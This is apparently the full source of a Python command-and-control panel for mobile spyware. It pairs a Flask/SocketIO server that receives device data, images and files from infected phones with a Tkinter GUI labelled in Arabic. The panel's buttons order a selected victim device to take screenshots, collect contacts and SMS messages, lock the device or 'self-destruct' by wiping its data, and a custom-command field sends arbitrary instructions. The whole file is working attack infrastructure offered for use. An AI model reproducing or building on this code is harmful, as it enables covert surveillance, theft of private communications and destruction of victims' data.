# c2_panel/app.py - Improved Version

import os
import json
import datetime
import threading
import logging
import webbrowser

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from PIL import Image, ImageTk

# --- Basic Settings ---
APP_ROOT = os.path.dirname(os.path.abspath(__file__))
DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
os.makedirs(DATA_RECEIVED_DIR, exist_ok=True)

# Flask and SocketIO Setup
app = Flask(__name__)
app.config["SECRET_KEY"] = "Jk8lP1yH3rT9uV5bX2sE7qZ4oW6nD0fA"
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    logger=False,
    engineio_logger=False,
)

# Logging Setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("C2Panel")

connected_clients_sio = {}
gui_app = None


# --- Flask API Endpoints ---
@app.route("/")
def index():
    return "C2 Panel is Running. Waiting for connections..."


@app.route("/upload_initial_data", methods=["POST"])
def upload_initial_data():
    logger.info("Request to /upload_initial_data")
    try:
        json_data_str = request.form.get("json_data")
        if not json_data_str:
            logger.error("No json_data found in request.")
            return jsonify({"status": "error", "message": "Missing json_data"}), 400

        try:
            data = json.loads(json_data_str)
            device_info_summary = data.get("deviceInfo", {}).get("model", "N/A")
            logger.info(f"Received JSON (model: {device_info_summary})")
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON received: {json_data_str[:100]}... Error: {e}")
            return jsonify({"status": "error", "message": "Invalid JSON format"}), 400

        device_info = data.get("deviceInfo", {})
        raw_device_id = data.get("deviceId", None)
        if (
            not raw_device_id
            or not isinstance(raw_device_id, str)
            or len(raw_device_id) < 5
        ):
            logger.warning(
                f"Received invalid or missing 'deviceId' from client: {raw_device_id}. Falling back."
            )
            model = device_info.get("model", "unknown_model")
            name = device_info.get("deviceName", "unknown_device")
            raw_device_id = f"{model}_{name}"

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in raw_device_id
        )
        if not device_id_sanitized or device_id_sanitized.lower() in [
            "unknown_model_unknown_device",
            "_",
            "unknown_device_unknown_model",
        ]:
            device_id_sanitized = f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        logger.info(f"Processing for Device ID (Sanitized): {device_id_sanitized}")
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        os.makedirs(device_folder_path, exist_ok=True)

        info_file_name = (
            f'info_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        )
        info_file_path = os.path.join(device_folder_path, info_file_name)
        with open(info_file_path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        logger.info(f"Saved JSON to {info_file_path}")

        image_file = request.files.get("image")
        if image_file and image_file.filename:
            filename = os.path.basename(image_file.filename)
            base, ext = os.path.splitext(filename)
            if not ext:
                ext = ".jpg"
            image_filename = (
                f"initial_img_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            )
            image_path = os.path.join(device_folder_path, image_filename)
            image_file.save(image_path)
            logger.info(f"Saved image to {image_path}")
        else:
            logger.info("No image file in initial data upload or filename was empty.")

        if gui_app:
            gui_app.add_system_log(f"Initial data from: {device_id_sanitized}")
            gui_app.refresh_historical_device_list()

        return jsonify({"status": "success", "message": "Initial data received"}), 200

    except Exception as e:
        logger.error(f"Error processing /upload_initial_data: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {e}"}),
            500,
        )


# --- SocketIO Event Handlers ---
@socketio.on("connect")
def handle_sio_connect():
    client_sid = request.sid
    logger.info(
        f"Client attempting to connect: SID={client_sid}, IP={request.remote_addr}"
    )


@socketio.on("disconnect")
def handle_sio_disconnect():
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        device_info = connected_clients_sio.pop(client_sid)
        dev_id_display = device_info.get("id", client_sid)
        logger.info(
            f"Device '{dev_id_display}' disconnected (SID={client_sid}, IP={device_info.get('ip','N/A')})."
        )
        if gui_app:
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{dev_id_display}' disconnected (SocketIO)."
            )
    else:
        logger.warning(
            f"Unknown client disconnected: SID={client_sid}, IP={request.remote_addr}."
        )


@socketio.on("register_device")
def handle_register_device(data):
    client_sid = request.sid
    try:
        device_identifier = data.get("deviceId", None)
        device_name_display = data.get("deviceName", f"Device_{client_sid[:6]}")
        device_platform = data.get("platform", "Unknown")

        if not device_identifier:
            logger.error(
                f"Registration failed for SID {client_sid}: 'deviceId' missing. Data: {data}"
            )
            emit(
                "registration_failed",
                {"message": "Missing 'deviceId' in registration payload."},
                room=client_sid,
            )
            return

        connected_clients_sio[client_sid] = {
            "sid": client_sid,
            "id": device_identifier,
            "name_display": device_name_display,
            "platform": device_platform,
            "ip": request.remote_addr,
            "connected_at": datetime.datetime.now().isoformat(),
            "last_seen": datetime.datetime.now().isoformat(),
        }
        logger.info(
            f"Device registered: ID='{device_identifier}', Name='{device_name_display}', SID={client_sid}, IP={request.remote_addr}"
        )
        emit(
            "registration_successful",
            {"message": "Successfully registered with C2 panel.", "sid": client_sid},
            room=client_sid,
        )

        if gui_app:
            gui_app.update_live_clients_list()
            gui_app.add_system_log(
                f"Device '{device_name_display}' (ID: {device_identifier}) connected via SocketIO from {request.remote_addr}."
            )
            if gui_app.current_selected_historical_device_id == device_identifier:
                gui_app._enable_commands(True)

    except Exception as e:
        logger.error(
            f"Error in handle_register_device for SID {client_sid}: {e}", exc_info=True
        )
        emit(
            "registration_failed",
            {"message": f"Server error during registration: {e}"},
            room=client_sid,
        )


@socketio.on("device_heartbeat")
def handle_device_heartbeat(data):
    client_sid = request.sid
    if client_sid in connected_clients_sio:
        connected_clients_sio[client_sid][
            "last_seen"
        ] = datetime.datetime.now().isoformat()
        if gui_app:
            gui_app.update_live_clients_list_item(client_sid)
    else:
        logger.warning(
            f"Heartbeat from unknown/unregistered SID: {client_sid}. Data: {data}. Requesting registration."
        )
        emit("request_registration_info", {}, room=client_sid)


# --- Command Dispatcher to Client ---
def send_command_to_client(target_sid, command_name, args=None):
    if args is None:
        args = {}
    if target_sid in connected_clients_sio:
        client_info = connected_clients_sio[target_sid]
        logger.info(
            f"Sending command '{command_name}' to device ID '{client_info['id']}' (SID: {target_sid}) with args: {args}"
        )
        socketio.emit(command_name, args, to=target_sid)
        if gui_app:
            gui_app.add_system_log(
                f"Sent command '{command_name}' to device '{client_info['id']}'."
            )
        return True
    else:
        errmsg = f"Target SID {target_sid} not found for command '{command_name}'."
        logger.error(errmsg)
        if gui_app:
            gui_app.add_system_log(errmsg, error=True)
            messagebox.showerror(
                "Command Error",
                f"Device (SID: {target_sid}) is not connected via SocketIO.",
            )
        return False


# --- Command Response Handler ---
@socketio.on("command_response")
def handle_command_response(data):
    client_sid = request.sid
    device_info = connected_clients_sio.get(client_sid)
    device_id_str = (
        device_info["id"]
        if device_info and "id" in device_info
        else f"SID_{client_sid}"
    )

    command_name = data.get("command", "unknown_command")
    status = data.get("status", "unknown")
    payload = data.get("payload", {})
    logger.info(
        f"Response for '{command_name}' from '{device_id_str}'. Status: {status}. Payload keys: {list(payload.keys()) if isinstance(payload, dict) else 'Not dict'}"
    )

    if gui_app:
        gui_app.add_system_log(
            f"Response for '{command_name}' from '{device_id_str}': {status}"
        )
        gui_app.display_command_response(device_id_str, command_name, status, payload)
        if (
            "filename_on_server" in payload
            and gui_app.current_selected_historical_device_id == device_id_str
        ):
            gui_app.display_device_details(device_id_str)


# --- Endpoint for Files from Commands ---
@app.route("/upload_command_file", methods=["POST"])
def upload_command_file():
    logger.info("Request to /upload_command_file")
    try:
        device_id = request.form.get("deviceId")
        command_ref = request.form.get("commandRef", "unknown_cmd_ref")

        if not device_id:
            logger.error("'deviceId' missing in command file upload.")
            return jsonify({"status": "error", "message": "Missing deviceId"}), 400

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in device_id
        )
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        if not os.path.exists(device_folder_path):
            logger.warning(f"Device folder '{device_folder_path}' not found. Creating.")
            os.makedirs(device_folder_path, exist_ok=True)
            if gui_app:
                gui_app.refresh_historical_device_list()

        file_data = request.files.get("file")
        if file_data and file_data.filename:
            original_filename = os.path.basename(file_data.filename)
            base, ext = os.path.splitext(original_filename)
            if not ext:
                ext = ".dat"

            safe_command_ref = "".join(c if c.isalnum() else "_" for c in command_ref)
            new_filename = f"{safe_command_ref}_{base}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            file_path = os.path.join(device_folder_path, new_filename)
            file_data.save(file_path)
            logger.info(
                f"Saved command file '{new_filename}' for device '{device_id_sanitized}' to {file_path}"
            )

            if gui_app:
                gui_app.add_system_log(
                    f"Received file '{new_filename}' from device '{device_id_sanitized}' (Ref: {command_ref})."
                )
                if gui_app.current_selected_historical_device_id == device_id_sanitized:
                    gui_app.display_device_details(device_id_sanitized)
            return (
                jsonify(
                    {
                        "status": "success",
                        "message": "File received by C2",
                        "filename_on_server": new_filename,
                    }
                ),
                200,
            )
        else:
            logger.error(
                "No file data in /upload_command_file request or filename empty."
            )
            return (
                jsonify({"status": "error", "message": "Missing file data in request"}),
                400,
            )

    except Exception as e:
        logger.error(f"Error processing /upload_command_file: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {e}"}),
            500,
        )


# --- GUI Class ---
class C2PanelGUI:
    def __init__(self, master):
        self.master = master
        master.title("لوحة التحكم - v1.0")
        master.geometry("1280x800")
        master.minsize(1024, 700)

        # تحسين المظهر العام
        self.style = ttk.Style()
        try:
            self.style.theme_use("clam")
        except tk.TclError:
            logger.warning("Clam theme not available, using default.")
            self.style.theme_use("default")

        # تحسين الخطوط والألوان
        self.style.configure("Treeview.Heading", font=("Segoe UI", 10, "bold"))
        self.style.configure("TLabel", font=("Segoe UI", 9))
        self.style.configure("TButton", font=("Segoe UI", 9))
        self.style.configure(
            "TLabelframe.Label", font=("Segoe UI", 10, "bold"), foreground="#006400"
        )

        # تعريف ألوان جديدة للأجهزة المتصلة
        self.style.configure(
            "Connected.TLabel", foreground="#008000"
        )  # أخضر للأجهزة المتصلة
        self.style.configure(
            "Disconnected.TLabel", foreground="#FF0000"
        )  # أحمر للأجهزة المنفصلة

        self.current_selected_historical_device_id = None
        self.current_selected_live_client_sid = None

        # تحسين تخطيط الواجهة
        self.paned_window = ttk.PanedWindow(master, orient=tk.HORIZONTAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # القسم الأيسر - قائمة الأجهزة
        self.left_pane = ttk.Frame(self.paned_window, width=400)
        self.paned_window.add(self.left_pane, weight=1)

        # تحسين قسم الأجهزة المخزنة
        hist_devices_frame = ttk.LabelFrame(self.left_pane, text="الأجهزة المسجلة")
        hist_devices_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # تحسين قائمة الأجهزة المخزنة
        self.hist_device_listbox = tk.Listbox(
            hist_devices_frame, height=12, exportselection=False, font=("Segoe UI", 9)
        )
        self.hist_device_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        self.hist_device_listbox.bind(
            "<<ListboxSelect>>", self.on_historical_device_select
        )
        hist_scrollbar = ttk.Scrollbar(
            hist_devices_frame,
            orient=tk.VERTICAL,
            command=self.hist_device_listbox.yview,
        )
        hist_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.hist_device_listbox.config(yscrollcommand=hist_scrollbar.set)

        # تحسين قسم الأجهزة المتصلة حالياً
        live_clients_frame = ttk.LabelFrame(
            self.left_pane, text="الأجهزة المتصلة حالياً"
        )
        live_clients_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # تحسين قائمة الأجهزة المتصلة
        self.live_clients_tree = ttk.Treeview(
            live_clients_frame,
            columns=("device_id", "last_seen"),
            show="headings",
            height=8,
        )
        self.live_clients_tree.heading("device_id", text="معرف الجهاز")
        self.live_clients_tree.heading("last_seen", text="آخر ظهور")
        self.live_clients_tree.column("device_id", width=200)
        self.live_clients_tree.column("last_seen", width=150)
        self.live_clients_tree.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        self.live_clients_tree.bind("<<TreeviewSelect>>", self.on_live_client_select)
        live_scrollbar = ttk.Scrollbar(
            live_clients_frame, orient=tk.VERTICAL, command=self.live_clients_tree.yview
        )
        live_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.live_clients_tree.config(yscrollcommand=live_scrollbar.set)

        # تحسين قسم سجل النظام
        system_log_frame = ttk.LabelFrame(self.left_pane, text="سجل النظام")
        system_log_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # تحسين عرض سجل النظام
        self.system_log = scrolledtext.ScrolledText(
            system_log_frame, height=8, width=40, font=("Consolas", 9)
        )
        self.system_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.system_log.config(state=tk.DISABLED)

        # القسم الأيمن - تفاصيل الجهاز والتحكم
        self.right_pane = ttk.Frame(self.paned_window)
        self.paned_window.add(self.right_pane, weight=2)

        # تحسين قسم تفاصيل الجهاز
        device_details_frame = ttk.LabelFrame(self.right_pane, text="تفاصيل الجهاز")
        device_details_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # تحسين عرض تفاصيل الجهاز
        self.device_details = scrolledtext.ScrolledText(
            device_details_frame, height=15, width=60, font=("Consolas", 9)
        )
        self.device_details.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.device_details.config(state=tk.DISABLED)

        # تحسين قسم الأوامر
        commands_frame = ttk.LabelFrame(self.right_pane, text="الأوامر")
        commands_frame.pack(pady=5, padx=5, fill=tk.BOTH)

        # تحسين أزرار الأوامر
        commands_buttons_frame = ttk.Frame(commands_frame)
        commands_buttons_frame.pack(fill=tk.X, padx=5, pady=5)

        # تحسين زر جمع المعلومات
        self.collect_info_btn = ttk.Button(
            commands_buttons_frame,
            text="جمع معلومات الجهاز",
            command=self.send_collect_info_command,
            state=tk.DISABLED,
        )
        self.collect_info_btn.grid(row=0, column=0, padx=5, pady=5, sticky="ew")

        # تحسين زر التقاط الشاشة
        self.screenshot_btn = ttk.Button(
            commands_buttons_frame,
            text="التقاط صورة للشاشة",
            command=self.send_screenshot_command,
            state=tk.DISABLED,
        )
        self.screenshot_btn.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        # تحسين زر قفل الجهاز
        self.lock_device_btn = ttk.Button(
            commands_buttons_frame,
            text="قفل الجهاز",
            command=self.send_lock_device_command,
            state=tk.DISABLED,
        )
        self.lock_device_btn.grid(row=0, column=2, padx=5, pady=5, sticky="ew")

        # تحسين زر التدمير الذاتي
        self.self_destruct_btn = ttk.Button(
            commands_buttons_frame,
            text="تفعيل التدمير الذاتي",
            command=self.send_self_destruct_command,
            state=tk.DISABLED,
        )
        self.self_destruct_btn.grid(row=1, column=0, padx=5, pady=5, sticky="ew")

        # تحسين زر جمع جهات الاتصال
        self.collect_contacts_btn = ttk.Button(
            commands_buttons_frame,
            text="جمع جهات الاتصال",
            command=self.send_collect_contacts_command,
            state=tk.DISABLED,
        )
        self.collect_contacts_btn.grid(row=1, column=1, padx=5, pady=5, sticky="ew")

        # تحسين زر جمع الرسائل
        self.collect_sms_btn = ttk.Button(
            commands_buttons_frame,
            text="جمع الرسائل",
            command=self.send_collect_sms_command,
            state=tk.DISABLED,
        )
        self.collect_sms_btn.grid(row=1, column=2, padx=5, pady=5, sticky="ew")

        # تحسين قسم الأمر المخصص
        custom_command_frame = ttk.Frame(commands_frame)
        custom_command_frame.pack(fill=tk.X, padx=5, pady=5)

        # تحسين حقل الأمر المخصص
        ttk.Label(custom_command_frame, text="أمر مخصص:").pack(side=tk.LEFT, padx=5)
        self.custom_cmd_entry = ttk.Entry(custom_command_frame, width=40)
        self.custom_cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        # تحسين زر إرسال الأمر المخصص
        self.custom_cmd_btn = ttk.Button(
            custom_command_frame,
            text="إرسال",
            command=self.send_custom_command,
            state=tk.DISABLED,
        )
        self.custom_cmd_btn.pack(side=tk.LEFT, padx=5)

        # تحسين قسم عرض الصور
        image_frame = ttk.LabelFrame(self.right_pane, text="الصور المستلمة")
        image_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # تحسين عرض الصور
        self.image_canvas = tk.Canvas(image_frame, bg="white")
        self.image_canvas.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.current_image = None

        # تحسين شريط القوائم
        menubar = tk.Menu(master)
        master.config(menu=menubar)

        # تحسين قائمة الملف
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="ملف", menu=file_menu)
        file_menu.add_command(
            label="تحديث قائمة الأجهزة", command=self.refresh_historical_device_list
        )
        file_menu.add_separator()
        file_menu.add_command(label="خروج", command=master.quit)

        # تحسين قائمة الأدوات
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="أدوات", menu=tools_menu)
        tools_menu.add_command(label="فتح مجلد البيانات", command=self.open_data_folder)

        # تحسين قائمة المساعدة
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="مساعدة", menu=help_menu)
        help_menu.add_command(label="حول", command=self.show_about)

        # تهيئة الواجهة
        self.refresh_historical_device_list()
        self.add_system_log("تم بدء لوحة التحكم بنجاح.")

    def refresh_historical_device_list(self):
        self.hist_device_listbox.delete(0, tk.END)
        try:
            if os.path.exists(DATA_RECEIVED_DIR):
                device_folders = [
                    d
                    for d in os.listdir(DATA_RECEIVED_DIR)
                    if os.path.isdir(os.path.join(DATA_RECEIVED_DIR, d))
                ]
                for device_id in sorted(device_folders):
                    self.hist_device_listbox.insert(tk.END, device_id)
                self.add_system_log(
                    f"تم تحديث قائمة الأجهزة: {len(device_folders)} جهاز."
                )
            else:
                self.add_system_log("مجلد البيانات غير موجود!", error=True)
        except Exception as e:
            self.add_system_log(f"خطأ في تحديث قائمة الأجهزة: {e}", error=True)

    def update_live_clients_list(self):
        # مسح القائمة الحالية
        for item in self.live_clients_tree.get_children():
            self.live_clients_tree.delete(item)

        # إضافة العملاء المتصلين مع تمييز الأجهزة المتصلة باللون الأخضر
        for sid, client_info in connected_clients_sio.items():
            device_id = client_info.get("id", f"SID_{sid[:8]}")
            last_seen_iso = client_info.get("last_seen", "")

            # تحويل التاريخ إلى صيغة مقروءة
            try:
                last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
                last_seen = last_seen_dt.strftime("%H:%M:%S %d/%m/%Y")
            except (ValueError, TypeError):
                last_seen = "غير معروف"

            # إضافة العميل إلى القائمة مع تمييزه باللون الأخضر
            item_id = self.live_clients_tree.insert(
                "", tk.END, values=(device_id, last_seen), tags=("connected",)
            )

            # تعيين لون أخضر للأجهزة المتصلة
            self.live_clients_tree.tag_configure("connected", foreground="#008000")

    def update_live_clients_list_item(self, sid):
        if sid in connected_clients_sio:
            # تحديث عنصر موجود
            client_info = connected_clients_sio[sid]
            device_id = client_info.get("id", f"SID_{sid[:8]}")
            last_seen_iso = client_info.get("last_seen", "")

            try:
                last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
                last_seen = last_seen_dt.strftime("%H:%M:%S %d/%m/%Y")
            except (ValueError, TypeError):
                last_seen = "غير معروف"

            # البحث عن العنصر في القائمة وتحديثه
            for item in self.live_clients_tree.get_children():
                if self.live_clients_tree.item(item, "values")[0] == device_id:
                    self.live_clients_tree.item(item, values=(device_id, last_seen))
                    break

    def on_historical_device_select(self, event):
        selection = self.hist_device_listbox.curselection()
        if selection:
            index = selection[0]
            device_id = self.hist_device_listbox.get(index)
            self.current_selected_historical_device_id = device_id
            self.display_device_details(device_id)

            # التحقق مما إذا كان الجهاز متصلاً حالياً
            is_connected = False
            for sid, client_info in connected_clients_sio.items():
                if client_info.get("id") == device_id:
                    is_connected = True
                    self.current_selected_live_client_sid = sid
                    break

            # تمكين/تعطيل أزرار الأوامر بناءً على حالة الاتصال
            self._enable_commands(is_connected)

            # إضافة سجل بالتحديد
            self.add_system_log(
                f"تم تحديد الجهاز: {device_id} (متصل: {'نعم' if is_connected else 'لا'})"
            )

    def on_live_client_select(self, event):
        selection = self.live_clients_tree.selection()
        if selection:
            item = selection[0]
            device_id = self.live_clients_tree.item(item, "values")[0]

            # البحث عن SID المقابل
            sid = None
            for client_sid, client_info in connected_clients_sio.items():
                if client_info.get("id") == device_id:
                    sid = client_sid
                    break

            if sid:
                self.current_selected_live_client_sid = sid
                self.current_selected_historical_device_id = device_id
                self.display_device_details(device_id)
                self._enable_commands(True)
                self.add_system_log(f"تم تحديد الجهاز المتصل: {device_id}")

    def display_device_details(self, device_id):
        device_folder = os.path.join(DATA_RECEIVED_DIR, device_id)
        if not os.path.exists(device_folder):
            self.add_system_log(f"مجلد الجهاز غير موجود: {device_folder}", error=True)
            return

        # تحديث نص التفاصيل
        self.device_details.config(state=tk.NORMAL)
        self.device_details.delete(1.0, tk.END)

        # إضافة معلومات الجهاز
        self.device_details.insert(tk.END, f"معرف الجهاز: {device_id}\n\n")

        # البحث عن ملفات المعلومات
        info_files = [
            f
            for f in os.listdir(device_folder)
            if f.startswith("info_") and f.endswith(".json")
        ]
        if info_files:
            latest_info_file = sorted(info_files)[-1]
            info_path = os.path.join(device_folder, latest_info_file)
            try:
                with open(info_path, "r", encoding="utf-8") as f:
                    info_data = json.load(f)

                # عرض معلومات الجهاز بتنسيق أفضل
                self.device_details.insert(tk.END, "--- معلومات الجهاز ---\n")
                device_info = info_data.get("deviceInfo", {})
                for key, value in device_info.items():
                    self.device_details.insert(tk.END, f"{key}: {value}\n")

                # عرض معلومات إضافية
                self.device_details.insert(tk.END, "\n--- معلومات إضافية ---\n")
                for key, value in info_data.items():
                    if key != "deviceInfo":
                        self.device_details.insert(tk.END, f"{key}: {value}\n")
            except Exception as e:
                self.device_details.insert(tk.END, f"خطأ في قراءة ملف المعلومات: {e}\n")
        else:
            self.device_details.insert(tk.END, "لا توجد ملفات معلومات متاحة.\n")

        # عرض قائمة الملفات المستلمة
        self.device_details.insert(tk.END, "\n--- الملفات المستلمة ---\n")
        files = [
            f
            for f in os.listdir(device_folder)
            if os.path.isfile(os.path.join(device_folder, f))
        ]
        for file in sorted(files):
            file_path = os.path.join(device_folder, file)
            file_size = os.path.getsize(file_path)
            file_time = datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
            self.device_details.insert(
                tk.END,
                f"{file} ({self._format_size(file_size)}) - {file_time.strftime('%Y-%m-%d %H:%M:%S')}\n",
            )

            # عرض الصور إذا كانت متاحة
            if file.lower().endswith((".jpg", ".jpeg", ".png", ".gif")):
                if file.startswith(("screenshot_", "initial_img_")):
                    self._display_image(os.path.join(device_folder, file))

        self.device_details.config(state=tk.DISABLED)

    def _format_size(self, size_bytes):
        # تنسيق حجم الملف بشكل مقروء
        for unit in ["B", "KB", "MB", "GB"]:
            if size_bytes < 1024.0:
                return f"{size_bytes:.1f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.1f} TB"

    def _display_image(self, image_path):
        try:
            # عرض الصورة على الكانفاس
            img = Image.open(image_path)

            # تغيير حجم الصورة للتناسب مع الكانفاس
            canvas_width = self.image_canvas.winfo_width()
            canvas_height = self.image_canvas.winfo_height()

            if canvas_width <= 1 or canvas_height <= 1:
                # إذا لم يتم تهيئة الكانفاس بعد، استخدم أحجام افتراضية
                canvas_width = 400
                canvas_height = 300

            # حساب النسبة للحفاظ على تناسب الصورة
            img_width, img_height = img.size
            ratio = min(canvas_width / img_width, canvas_height / img_height)
            new_width = int(img_width * ratio)
            new_height = int(img_height * ratio)

            # تغيير حجم الصورة
            img = img.resize((new_width, new_height), Image.LANCZOS)

            # تحويل الصورة إلى صيغة Tkinter
            photo = ImageTk.PhotoImage(img)

            # حفظ مرجع للصورة لمنع جامع القمامة من إزالتها
            self.current_image = photo

            # مسح الكانفاس وعرض الصورة
            self.image_canvas.delete("all")
            self.image_canvas.create_image(
                canvas_width // 2, canvas_height // 2, image=photo, anchor=tk.CENTER
            )

            # إضافة نص وصفي
            filename = os.path.basename(image_path)
            self.image_canvas.create_text(
                10, 10, text=filename, anchor=tk.NW, fill="black"
            )
        except Exception as e:
            self.add_system_log(f"خطأ في عرض الصورة {image_path}: {e}", error=True)

    def _enable_commands(self, enable=True):
        # تمكين/تعطيل أزرار الأوامر
        state = tk.NORMAL if enable else tk.DISABLED
        self.collect_info_btn.config(state=state)
        self.screenshot_btn.config(state=state)
        self.lock_device_btn.config(state=state)
        self.self_destruct_btn.config(state=state)
        self.collect_contacts_btn.config(state=state)
        self.collect_sms_btn.config(state=state)
        self.custom_cmd_btn.config(state=state)
        self.custom_cmd_entry.config(state=state)

    def add_system_log(self, message, error=False):
        # إضافة رسالة إلى سجل النظام
        self.system_log.config(state=tk.NORMAL)
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {'ERROR: ' if error else ''}{message}\n"
        self.system_log.insert(tk.END, log_entry)
        if error:
            self.system_log.tag_add(
                "error",
                f"{float(self.system_log.index(tk.END)) - 1.0 - len(log_entry)/1.0}",
                tk.END,
            )
            self.system_log.tag_config("error", foreground="red")
        self.system_log.see(tk.END)
        self.system_log.config(state=tk.DISABLED)
        logger.info(message) if not error else logger.error(message)

    def display_command_response(self, device_id, command, status, payload):
        # عرض استجابة الأمر
        if status == "success":
            self.add_system_log(f"نجاح الأمر '{command}' للجهاز '{device_id}'")
        else:
            self.add_system_log(
                f"فشل الأمر '{command}' للجهاز '{device_id}': {payload.get('message', 'No message')}",
                error=True,
            )

    def send_collect_info_command(self):
        # إرسال أمر جمع المعلومات
        if self.current_selected_live_client_sid:
            send_command_to_client(
                self.current_selected_live_client_sid, "collect_device_info", {}
            )

    def send_screenshot_command(self):
        # إرسال أمر التقاط الشاشة
        if self.current_selected_live_client_sid:
            send_command_to_client(
                self.current_selected_live_client_sid, "take_screenshot", {}
            )

    def send_lock_device_command(self):
        # إرسال أمر قفل الجهاز
        if self.current_selected_live_client_sid:
            if messagebox.askyesno(
                "تأكيد",
                "هل أنت متأكد من رغبتك في قفل الجهاز؟ قد يتسبب ذلك في عدم إمكانية الوصول إليه.",
            ):
                send_command_to_client(
                    self.current_selected_live_client_sid, "lock_device", {}
                )

    def send_self_destruct_command(self):
        # إرسال أمر التدمير الذاتي
        if self.current_selected_live_client_sid:
            if messagebox.askyesno(
                "تأكيد",
                "هل أنت متأكد من رغبتك في تفعيل التدمير الذاتي؟ سيؤدي ذلك إلى حذف جميع البيانات على الجهاز.",
                icon="warning",
            ):
                send_command_to_client(
                    self.current_selected_live_client_sid, "self_destruct", {}
                )

    def send_collect_contacts_command(self):
        # إرسال أمر جمع جهات الاتصال
        if self.current_selected_live_client_sid:
            send_command_to_client(
                self.current_selected_live_client_sid, "collect_contacts", {}
            )

    def send_collect_sms_command(self):
        # إرسال أمر جمع الرسائل
        if self.current_selected_live_client_sid:
            send_command_to_client(
                self.current_selected_live_client_sid, "collect_sms", {}
            )

    def send_custom_command(self):
        # إرسال أمر مخصص
        if self.current_selected_live_client_sid:
            cmd = self.custom_cmd_entry.get().strip()
            if cmd:
                if ":" in cmd:
                    cmd_parts = cmd.split(":", 1)
                    cmd_name = cmd_parts[0].strip()
                    try:
                        cmd_args = json.loads(cmd_parts[1].strip())
                        if not isinstance(cmd_args, dict):
                            cmd_args = {"value": cmd_args}
                    except json.JSONDecodeError:
                        cmd_args = {"value": cmd_parts[1].strip()}
                else:
                    cmd_name = cmd
                    cmd_args = {}

                send_command_to_client(
                    self.current_selected_live_client_sid, cmd_name, cmd_args
                )
                self.custom_cmd_entry.delete(0, tk.END)

    def open_data_folder(self):
        # فتح مجلد البيانات
        try:
            if os.path.exists(DATA_RECEIVED_DIR):
                if os.name == "nt":  # Windows
                    os.startfile(DATA_RECEIVED_DIR)
                elif os.name == "posix":  # macOS or Linux
                    try:
                        os.system(f"xdg-open {DATA_RECEIVED_DIR}")
                    except:
                        os.system(f"open {DATA_RECEIVED_DIR}")
            else:
                self.add_system_log("مجلد البيانات غير موجود!", error=True)
        except Exception as e:
            self.add_system_log(f"خطأ في فتح مجلد البيانات: {e}", error=True)

    def show_about(self):
        # عرض معلومات حول التطبيق
        messagebox.showinfo(
            "حول",
            "لوحة التحكم - الإصدار 1.0\n\n"
            "لوحة تحكم مبسطة للتواصل مع تطبيقات الأجهزة المحمولة.\n"
            "تم تحسينها للأداء والبساطة.",
        )


# --- Main Function ---
def main():
    global gui_app

    # إنشاء نافذة Tkinter
    root = tk.Tk()
    gui_app = C2PanelGUI(root)

    # بدء خادم Flask في خيط منفصل
    server_thread = threading.Thread(
        target=lambda: socketio.run(
            app, host="0.0.0.0", port=5000, debug=False, use_reloader=False
        )
    )
    server_thread.daemon = True
    server_thread.start()

    # عرض عنوان IP المحلي
    try:
        import socket

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        logger.info(f"Server running at http://{ip_address}:5000")
        gui_app.add_system_log(f"الخادم يعمل على http://{ip_address}:5000")
    except Exception as e:
        logger.error(f"Could not determine local IP: {e}")

    # بدء حلقة Tkinter
    root.mainloop()


if __name__ == "__main__":
    main()
